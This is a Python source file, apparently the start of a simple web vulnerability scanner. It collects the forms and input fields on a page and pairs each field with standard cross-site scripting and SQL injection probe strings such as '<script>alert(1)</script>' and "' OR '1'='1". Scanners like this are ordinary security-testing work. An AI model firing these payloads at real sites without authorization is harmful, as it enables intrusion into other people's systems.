import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def scan_forms(url):
    forms = []
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        for form in soup.find_all("form"):
            form_details = {}
            form_details["action"] = urljoin(url, form.get("action"))
            form_details["method"] = form.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.get("type", "text")
                input_name = input_tag.get("name")
                if input_name:
                    inputs.append({"type": input_type, "name": input_name})
            form_details["inputs"] = inputs
            forms.append(form_details)
    except Exception as e:
        pass
    return forms
#
def analyze_inputs_and_generate_payloads(forms):
    payloads = {
        "text": ["<script>alert(1)</script>", "' OR '1'='1", "<img src=x onerror=alert(1)>"],
        "search": ["<svg/onload=alert(1)>", "' OR 'a'='a"],
        "email": ["test@example.com", "x@x.com<script>alert(1)</script>"],
        "password": ["admin123", "' OR '1'='1"],
        "number": ["999999", "0 OR 1=1"],
    }

    test_vectors = []

    for form in forms:
        inputs = form.get("inputs", [])
        test_case = {
            "action": form.get("action"),
            "method": form.get("method", "get").lower(),
            "test_payloads": []
        }

        for inp in inputs:
            name = inp.get("name")
            typ = inp.get("type", "text").lower()

            if not name:
                continue

            if typ in payloads:
                for p in payloads[typ]:
                    test_case["test_payloads"].append({name: p})

        if test_case["test_payloads"]:
            test_vectors.append(test_case)

    return test_vectors
